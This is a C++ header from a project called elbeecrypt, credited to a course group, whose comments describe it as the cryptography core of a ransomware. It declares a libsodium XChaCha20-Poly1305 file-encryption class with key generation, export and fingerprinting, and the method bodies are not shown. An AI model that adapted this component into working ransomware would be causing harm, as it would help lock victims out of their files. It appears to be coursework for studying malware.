#pragma once

#include <array>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <sodium.h>
#include <string>
#include "elbeecrypt/common/utils/container.hpp"
#include "elbeecrypt/common/utils/stream.hpp"

namespace fs = std::filesystem;

namespace elbeecrypt::common::io {
	/**
	 * @brief Contains the main cryptography logic for the ransomware.
	 * This engine uses LibSodium to achieve the cryptography functionality.
	 * This class wraps all the complexity behind an easy to use interface,
	 * including handling the keypairs, nonces, etc. The core of the
	 * encryption and decryption logic of this class is based around
	 * LibSodium's Secret Stream API. This API utilizes a stream cipher
	 * to encrypt and decrypt a file that is loaded into memory in chunks.
	 * The actual logic to handle the process (generating nonces, adding
	 * MAC padding, etc) is seamlessly handled by LibSodium and allows
	 * the stream cipher to work to the best of its ability. The
	 * cipher and authentication mode is as follows: XChaCha20-Poly1305
	 * The reason is because ChaCha20-Poly1305, and by extension,
	 * the X variant, unlike AES-GCM, is not vulnerable to timing
	 * attacks and runs 3x faster in software. Sources:
	 * https://github.com/jedisct1/libsodium-doc/blob/master/secret-key_cryptography/aead.md
	 * 
	 * The relevant LibSodium documentation can be found
	 * here: https://doc.libsodium.org/secret-key_cryptography/secretstream#file-encryption-example-code
	 * A password-based approach to this problem can be found
	 * here: https://github.com/jpiechowka/libsodium-file-crypter
	 * 
	 * @author CECS-378 Group 10
	 * @file cryptor-engine.hpp
	 */
	class CryptorEngine {
		//Enum constants
		public:
			/** An enum outlining the status of an operation performed by methods of this class. */
			enum Status : int {
				/** The operation in question completed successfully. */
				OK = 0,

				/** The operation in question failed. */
				FAIL = -1
			};


		//Non-enum public constants (keep in mind that each of these is an `unsigned int` (a 32-bit integer))
		public:
			/** The ciphersuite that this class uses. This is for metadata purposes. */
			const static std::string CIPHER_ALGO;

			/** The key type that this class uses. This is for metadata purposes. */
			const static std::string KEY_TYPE;

			/** The size of the private key in bytes. This is an alias of `crypto_box_curve25519xchacha20poly1305_SECRETKEYBYTES`. */
			constexpr static uint32_t PRIVKEY_SIZE = crypto_box_curve25519xchacha20poly1305_SECRETKEYBYTES;

			/** The size of the public key in bytes. This is an alias of `crypto_box_curve25519xchacha20poly1305_PUBLICKEYBYTES`. */
			constexpr static uint32_t PUBKEY_SIZE = crypto_box_curve25519xchacha20poly1305_PUBLICKEYBYTES;

			/** The size of the shared key in bytes. This is an alias of `crypto_secretstream_xchacha20poly1305_KEYBYTES`. */
			constexpr static uint32_t SHAREDKEY_SIZE = crypto_secretstream_xchacha20poly1305_KEYBYTES;


		//Non-enum private constants
		private:
			/** The default size of the plaintext buffer (64 KB). */
			constexpr static uint32_t DEFAULT_PT_BUF_SIZE = 65540;

			/** The size of the internal header buffer that is appended to encrypted files. This is an alias of `crypto_secretstream_xchacha20poly1305_HEADERBYTES`. */
			constexpr static uint32_t H_BUF_SIZE = crypto_secretstream_xchacha20poly1305_HEADERBYTES;


		//Fields
		private:
			/** The private key to use in the encryption and decryption operations. Keep this key safe! */
			std::array<uint8_t, PRIVKEY_SIZE> privkey;

			/** The public key to use in the encryption and decryption operations. */
			std::array<uint8_t, PUBKEY_SIZE> pubkey;

			/** The shared key to use for encryption and decryption. This key is a shared secret generated from the given public and private keys. */
			std::array<uint8_t, SHAREDKEY_SIZE> sharedkey;

			/** The size of each chunk in bytes. */
			const uint32_t _chunkSize;

			/** The size of each ciphered chunk in bytes. The value of this variable will always be `chunkSize + crypto_secretstream_xchacha20poly1305_ABYTES`. */
			const uint32_t cipheredChunkSize;

			
		//Constructors & Destructor
		public:
			/**
			 * @brief Constructs a new CryptorEngine object with a 
			 * given private key and a defined chunk size of x bytes. 
			 * Throws a `runtime_error` if LibSodium fails to initialize
			 * or the keygen operation failed.
			 * 
			 * @param key The private key to use
			 * @param chunkSize The size of each chunk in bytes
			 * @throws std::runtime_error If LibSodium failed to initialize or a keygen error occurred
			 */
			CryptorEngine(std::array<uint8_t, PRIVKEY_SIZE>& key, const uint32_t& chunkSize); //Constructor 1a: keys by array

			/**
			 * @brief Constructs a new CryptorEngine object with a 
			 * given private key and the default chunk size of 64 
			 * kilobytes. Throws a `runtime_error` if LibSodium fails 
			 * to initialize or the keygen operation failed.
			 * 
			 * @param key The private key to use
			 * @throws std::runtime_error If LibSodium failed to initialize or a keygen error occurred
			 */
			CryptorEngine(std::array<uint8_t, PRIVKEY_SIZE>& key); //Constructor 1b: keys by array

			/**
			 * @brief Constructs a new CryptorEngine object with a 
			 * given private key and a defined chunk size of x bytes. 
			 * Throws a `runtime_error` if LibSodium fails to initialize,
			 * the private key could not be loaded, the private key
			 * format is invalid, or the keygen operation failed.
			 * 
			 * @param keyPath The path to the private key to use. Must be a raw binary file
			 * @param chunkSize The size of each chunk in bytes
			 * @throws std::runtime_error If LibSodium failed to initialize, the private key could not be loaded,
			 * the private key format is invalid, or the keygen operation failed.
			 */
			CryptorEngine(const fs::path& keyPath, const uint32_t& chunkSize); //Constructor 2a: keys by path

			/**
			 * @brief Constructs a new CryptorEngine object with a 
			 * given private key and the default chunk size of 64 
			 * kilobytes Throws a `runtime_error` if LibSodium fails 
			 * to initialize, the private key could not be loaded, 
			 * the private key format is invalid, or the keygen operation 
			 * failed.
			 * 
			 * @param keyPath The path to the private key to use. Must be a raw binary file
			 * @param chunkSize The size of each chunk in bytes
			 * @throws std::runtime_error If LibSodium failed to initialize, the private key could not be loaded,
			 * the private key format is invalid, or the keygen operation failed.
			 */
			CryptorEngine(const fs::path& keyPath); //Constructor 2b: keys by path

			/**
			 * @brief Constructs a new CryptorEngine object with a 
			 * random public and private key. and a defined chunk
			 * size of x bytes. Throws a `runtime_error` if LibSodium 
			 * fails to initialize or the keygen operation failed.
			 * 
			 * @param chunkSize The size of each chunk in bytes
			 * @throws std::runtime_error If LibSodium failed to initialize or a keygen error occurred
			 */
			CryptorEngine(const uint32_t& chunkSize); //Constructor 3a: random keys

			/**
			 * @brief Constructs a new CryptorEngine object with a 
			 * random public and private key. and the default chunk
			 * size of 64 kilobytes. Throws a `runtime_error` if 
			 * LibSodium fails to initialize or the keygen operation 
			 * failed.
			 * 
			 * @throws std::runtime_error If LibSodium failed to initialize or a keygen error occurred
			 */
			CryptorEngine(); //Constructor 3b: random keys
			
			/**
			 * @brief Destroys the CryptorEngine object and securely
			 * erases the keys used by zeroing them out.
			 */
			~CryptorEngine();


		//Getters
		public:
			/**
			 * @brief Gets the private key that this class will use
			 * for encryption and decryption operations. Do keep
			 * in mind that this is a sensitive key. Care must be 
			 * taken when handling it. Additionally, when the 
			 * destructor of this object is called, this key will
			 * be destroyed too.
			 * 
			 * @return An immutable reference to the private key
			 */
			const std::array<uint8_t, PRIVKEY_SIZE>& getPrivkey() const;

			/**
			 * @brief Gets the public key that this class will use
			 * for encryption and decryption operations. While this
			 * key isn't directly used for encryption or decryption,
			 * it can serve as an identifier of sorts since it is
			 * cryptographically tied to the private key. Additionally, 
			 * when the destructor of this object is called, this key 
			 * will be destroyed too.
			 * 
			 * @return An immutable reference to the public key
			 */
			const std::array<uint8_t, PUBKEY_SIZE>& getPubkey() const;

			/**
			 * @brief Gets the shared key that this class will use
			 * for encryption and decryption operations. Do keep
			 * in mind that this is a sensitive key. Care must be 
			 * taken when handling it. This key is generated from
			 * the private and public keypair and is the key that 
			 * is actually used to encrypt and decrypt the files
			 * that this class will process. Additionally, when the 
			 * destructor of this object is called, this key will
			 * be destroyed too.
			 * 
			 * @return An immutable reference to the shared key
			 */
			const std::array<uint8_t, SHAREDKEY_SIZE>& getSharedkey() const;


		//Methods
		public:
			/**
			 * @brief Decrypts a file using LibSodium's secret stream API. Keep
			 * in mind that this method does not modify the source file. It must
			 * be dealt with separately.
			 * 
			 * @param src The path of the file to decrypt
			 * @param dest The path of the decrypted file
			 * @return The result of the operation. See `CryptorEngine::Status`
			 */
			Status decryptFile(const fs::path& src, const fs::path& dest);

			/**
			 * @brief Encrypts a file using LibSodium's secret stream API. Keep
			 * in mind that this method does not modify the source file. It must
			 * be dealt with separately.
			 * 
			 * @param src The path of the file to encrypt
			 * @param dest The path of the encrypted file
			 * @return The result of the operation. See `CryptorEngine::Status`
			 */
			Status encryptFile(const fs::path& src, const fs::path& dest);

			/**
			 * @brief Exports the private key to a file at the given path.
			 * 
			 * @param dest The file to write the key to
			 * @return Whether the operation completed successfully
			 */
			bool exportPrivkey(const fs::path& dest);

			/**
			 * @brief Exports the public key to a file at the given path.
			 * 
			 * @param dest The file to write the key to
			 * @return Whether the operation completed successfully
			 */
			bool exportPubkey(const fs::path& dest);

			/**
			 * @brief Gets the SHA-256 fingerprint of the private key.
			 * 
			 * @return The SHA-256 fingerprint of the private key
			 */
			std::string privkeyFingerprint();

			/**
			 * @brief Gets the SHA-256 fingerprint of the public key.
			 * 
			 * @return The SHA-256 fingerprint of the public key
			 */
			std::string pubkeyFingerprint();

			/**
			 * @brief Returns the string representation of this object.
			 * 
			 * @return The string representation of this object
			 */
			std::string toString();


		//Operator overloads
		public:
			/**
			 * @brief Returns the string representation of this object. 
			 * Also allows for implicit string casting. 
			 * 
			 * @return The string representation of this object
			 */
			operator std::string();


		//Private methods
		private:
			/**
			 * @brief Calculates the size of ciphered chunk array using a given
			 * chunk size. This value will be the sum of `chunkSize` and
			 * `crypto_secretstream_xchacha20poly1305_ABYTES`.
			 * 
			 * @param chunkSize The size of each chunk in bytes
			 * @return The size of the ciphered chunk array
			 */
			uint32_t calculateCipheredChunkSize(const uint32_t& chunkSize);

			/**
			 * @brief Closes the two `fstream` objects and all buffers used in 
			 * an encryption or decryption operation.
			 * 
			 * @param in The input fstream object
			 * @param out The output fstream object
			 * @param bufferA The first buffer to deallocate
			 * @param bufferB The second buffer to deallocate
			 * @param bufferC The third buffer to deallocate
			 */
			static void cleanup(std::ifstream& in, std::ofstream& out, uint8_t* bufferA, uint8_t* bufferB, uint8_t* bufferC);

			/**
			 * @brief Exports a key to a file at the given path.
			 * 
			 * @tparam size The size of the key array
			 * @param key The key array to export
			 * @param dest The file to write the key to
			 * @return Whether the operation completed successfully
			 */
			template<size_t size>
			static bool exportKey(std::array<uint8_t, size> key, const fs::path& dest){
				//Create the stream to write the key to
				std::ofstream keyStream;
				if(!elbeecrypt::common::utils::Stream::loadFStream(keyStream, dest, std::ios::binary | std::ios::out)) return false;

				//Write the key to the stream
				keyStream.write((char*) key.data(), key.size());
				
				//Return true, assuming everything else went okay
				return true;
			}

			/**
			 * @brief Generates the SHA-256 fingerprint of a given key. See
			 * https://libsodium.gitbook.io/doc/advanced/sha-2_hash_function
			 * 
			 * @tparam size The size of the key array
			 * @param key The key array to digest
			 * @return The SHA-256 representation of the key
			 */
			template<size_t size>
			static std::string fingerprint(const std::array<uint8_t, size>& key){
				//Create the output array to store the digest bytes
				uint8_t hash[crypto_hash_sha256_BYTES];

				//Digest the key using SHA-256
				crypto_hash_sha256(hash, key.data(), key.size());

				//Convert the digest array to a string and return it
				return elbeecrypt::common::utils::Container::cIntArrayToStr(hash, crypto_hash_sha256_BYTES, false);
			}

			/**
			 * @brief Generates a shared secret out of a private and 
			 * public key. Increases efficiency with the encryption
			 * and decryption operations, as the key only has to be
			 * generated once. See https://libsodium.gitbook.io/doc/public-key_cryptography/authenticated_encryption#precalculation-interface
			 * 
			 * @param privkey The private key
			 * @param pubkey The public key
			 * @return The shared secret among the two keys
			 * @throws std::runtime_error If the private key could not be loaded
			 */
			static std::array<uint8_t, SHAREDKEY_SIZE> generateSharedSecret(const std::array<uint8_t, PRIVKEY_SIZE>& privkey, const std::array<uint8_t, PUBKEY_SIZE>& pubkey);
	
			/**
			 * @brief Initializes LibSodium to ensure safe usage of its
			 * features. See https://libsodium.gitbook.io/doc/usage
			 * 
			 * @throws std::runtime_error If LibSodium failed to initialize
			 */
			static void init();

			/**
			 * @brief Generates the other two required keys from the 
			 * given private key
			 * 
			 * @param key The input private key
			 *  @throws std::runtime_error If LibSodium failed to initialize or a keygen error occurred
			 */
			void setupFromPrivkey(const std::array<uint8_t, PRIVKEY_SIZE>& key);
	};
}
